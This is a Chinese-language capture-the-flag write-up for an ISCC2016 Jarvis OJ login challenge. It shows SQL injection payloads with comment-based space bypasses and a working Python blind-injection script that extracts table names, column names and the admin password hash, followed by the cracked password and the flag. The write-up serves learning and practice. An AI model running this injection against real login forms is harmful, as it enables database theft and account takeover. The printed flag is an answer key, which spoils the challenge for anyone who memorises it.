## 描述

很简单的注入，大家试试？

题目入口：http://web.jarvisoj.com:32787/

题目来源：ISCC2016

## 题解

```html
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Login</title>

    <!-- Bootstrap core CSS -->
    <link href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet">
    <!-- Custom styles for this template -->
    <link href="css/signin.css" rel="stylesheet">
</head>
    
<body>

    <div class="container">

      <form class="form-signin" action="" method="POST">
        <h2 class="form-signin-heading">Please sign in</h2>
        <label for="username" class="sr-only">Username</label>
        <input type="text" id="username" name="username" class="form-control" placeholder="Username" required autofocus>
        <label for="password" class="sr-only">Password</label>
        <input type="password" id="password" name="password" class="form-control" placeholder="Password" required>
                <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
      </form>
    </div> <!-- /container -->
  </body>
</html>
```

没啥奇特的地方，应该就是只靠注入。

尝试了几次，发现会提示 `用户名错误` 或 `密码错误`，而且当用户名为 admin 的时候就是 `密码错误`，其余情况是 `用户名错误`。所以考虑从这个用户名入手。

试了下 `admin'` 是失败的，但是 `admin'#` 是成功的。再试了下空格得替换成 `/**/`，`a'/**/or/**/1` 也可以是 `密码错误`。

折腾了一下，真的折腾不出来了，看题解。需要利用 `密码错误` 和 `用户名错误` 来盲注。第一次听说 66666。

盲注其实原理很简单，既然我们只能用布尔式子来判断，那么我们可以将想要输出句子的结果映射到一个数字上，然后用这个数字与给定数字进行大小比较，于是便可以二分。

```python
import requests
import sys
url = 'http://web.jarvisoj.com:32787/login.php'
data = {
    'username': '',
    'password': 'gg',
}
key = '密码错误'
cmd = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
username = "'/**/or/**/ascii(substr(({}),{},1))>={}#"
for i in range(1, 100):
    l, r = 1, 127
    while l <= r:
        m = (l + r) >> 1
        data['username'] = username.format(cmd.replace(' ', '/**/'), i, m)
        t = requests.post(url, data=data)
        if key in t.text:
            l = m + 1
        else:
            r = m - 1
    if r <= 0:
        break
    print(chr(l-1), end='')
    sys.stdout.flush()
print()
```

得到表名 `admin`。再来弄列名，直接将上面代码改一下

```python
cmd = "select group_concat(column_name) from information_schema.columns where table_name='admin'"
```

得到 `id,username,password`，再改成以下命令

```python
cmd = "select password from admin where username='admin'"
```

便能得到加密密码 `334cfb59c9d74849801d5acdcfdaadc3`，丢去 MD5 破解网站得到密码 `eTAloCrEP`。登录便能得到 flag。

## 答案

CTF{s1mpl3_1nJ3ction_very_easy!!}
